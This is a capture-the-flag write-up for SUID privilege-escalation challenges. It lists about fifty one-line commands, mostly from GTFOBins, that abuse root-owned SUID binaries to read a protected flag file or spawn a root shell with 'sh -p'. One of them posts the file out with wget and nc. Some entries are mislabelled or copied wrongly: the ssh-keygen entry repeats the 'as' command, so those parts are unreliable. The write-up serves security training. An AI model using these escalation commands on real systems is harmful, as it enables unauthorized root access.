# Babysuid

These challenges work as following:

1. We need to select a linux program that is owned by root.
2. The program will be +s'ed (which means that its EUID will be 0).
3. Use that program to read the flag file (at the / directory) which only root user can.
4. The used programs cannot be repeated

All challenges account for a total of 100 programs which will force us to use programs that were not designed to print files. <br>

## Programs

GTFOBins
GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems. We are going to grab a lot of payloads from GTFOBins in babysuid:
https://gtfobins.github.io/

### 1 - cat

```bash
ctf$: cat /flag
```

### 2 - more

```bash
ctf$: more /flag
```

### 3 - less

```bash
ctf$: less /flag
```

### 4 - tail

```bash
ctf$: tail /flag
```

### 5 - head

```bash
ctf$: head /flag
```

### 6 - sort

```bash
ctf$: sort -r /flag
```

### 7 - rev

```bash
ctf$: rev /flag | rev
```

### 8 - vim

```bash
ctf$: vim /flag
```

### 9 - emacs

```bash
ctf$: emacs /flag
```

### 10 - nano

```bash
ctf$: nano /flag
```

### 11 - od

```bash
ctf$: od -w100 -c /flag|sed 's# ##g'
```

### 12 - hd

```bash
ctf$: hd -c /flag  ||  hexdump -C /flag
```

### 13 - xxd

```bash
ctf$: xxd /flag
```

### 14 - base32

```bash
ctf$: base32 /flag | base32 -d
```

### 15 - base64

```bash
ctf$: base64 /flag | base64 -d
```

### 16 - split

```bash
ctf$: split /flag
```

### 17 - gzip

```bash
ctf$: gzip -c /flag | gzip -d
```

### 18 - bzip2

```bash
ctf$: bzip2 -c /flag | bzip2 -d
```

### 19 - zip

```bash
ctf$: LFILE=/flag;TF=$(mktemp -u);zip $TF $LFILE;unzip -p $TF
```

### 20 - tar

```bash
ctf$: LFILE=/flag;tar xf "$LFILE" -I 'sh -c "cat 1>&2"'
```

### 21 - ar

```bash
ctf$: TF=$(mktemp -u);LFILE=/flag;ar r "$TF" "$LFILE";cat "$TF"

```

### 22 - cpio

```bash
ctf$: LFILE=file_to_read
echo "$LFILE" | cpio -o
```

### 23 - genisoimage

```bash
ctf$: genisoimage -sort "/flag"

```

### 24 - env

```bash
ctf$: env sh -p => read file
```

### 25 - find

```bash
./find . -exec sh -p \; -quit
```

### 26 - make

```bash
ctf$: COMMAND='sh -p'
./make -s --eval=$'x:\n\t-'"$COMMAND"
```

### 27 - nice

nice - run a program with modified scheduling priority

```bash
ctf$: nice sh -p
```

### 28 - timeout

timeout - run a command with a time limit

```bash
ctf$: ./timeout 7d sh -p
```

### 29 - stdbuf

stdbuf - Run COMMAND, with modified buffering operations for its
standard streams

```bash
ctf$: ./stdbuf -i0 sh -p
```

### 30 - setarch

```bash
ctf$: ./setarch $(arch) /bin/sh -p
```

### 31 - watch

watch - execute a program periodically, showing output fullscreen

```bash
ctf$: ./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'
```

### 32 - socat

```bash
ctf$: socat -u "file:/flag" -
```

### 33 - whiptail

whiptail - display dialog boxes from shell scripts

```bash
ctf$: LFILE=file_to_read
./whiptail --textbox "$LFILE" 20 80
```

### 34 - awk

mawk - pattern scanning and text processing language

```bash
ctf$: ./awk '//' "$LFILE"
```

### 35 - sed

sed - stream editor for filtering and transforming text

```bash
ctf$: ./sed -e '' "$LFILE"
```

### 36 - ed

ed - line-oriented text editor

```bash
ctf$: ./ed file_to_read
,p
q
```

### 37 - chown

chown - change file owner and group

```bash
ctf$: ./chown $(id -un):$(id -gn) /flag
```

### 38 - chmod

```bash
ctf$: ./chmod 6777 /flag
```

### 39 - cp

```bash
ctf$: cp /flag /dev/stdout
```

### 40 - mv

```bash
ctf$: /challenge/babysuid_level40 && mv /usr/bin/bash /usr/bin/mv && /challenge/babysuid_level40 && mv -p
```

### 41 - perl

```bash
ctf$: ./perl -ne print /flag
```

### 42 - python

```bash
ctf$: python -c 'print(open("file_to_read").read())'
```

### 43 - ruby

```bash
ctf$: ruby -e 'puts File.read("file_to_read")'
or
ctf$: #!/usr/bin/ruby
aFile = File.new("/flag", "r")
if aFile
content = aFile.sysread(100)
puts content
else
puts "Unable to open file!"
end
```

### 44 - bash

```bash
ctf$: bash -p  /flag

```

### 45 - date

```bash
ctf$: date -f  /flag

```

### 46 - dmesg

dmesg - print or control the kernel ring buffer

```bash
ctf$: dmesg -rF /flag
```

### 47 - wc

wc - print newline, word, and byte counts for each file

```bash
ctf$: wc --files0-from "$LFILE"
```

### 48 - gcc

wc - print newline, word, and byte counts for each file

```bash
ctf$: gcc -x c -E "$LFILE"
```

### 49 - as

AS - the portable GNU assembler.

```bash
ctf$:  as @$LFILE
```

### 50 - wget

```bash
ctf$:  wget -i /flag or...
ctf$: nc -lp 8888 & wget --post-file=/flag http://127.0.0.1:8888
```

### 51 - ssh-keygen

```bash
ctf$:  as @$LFILE
```
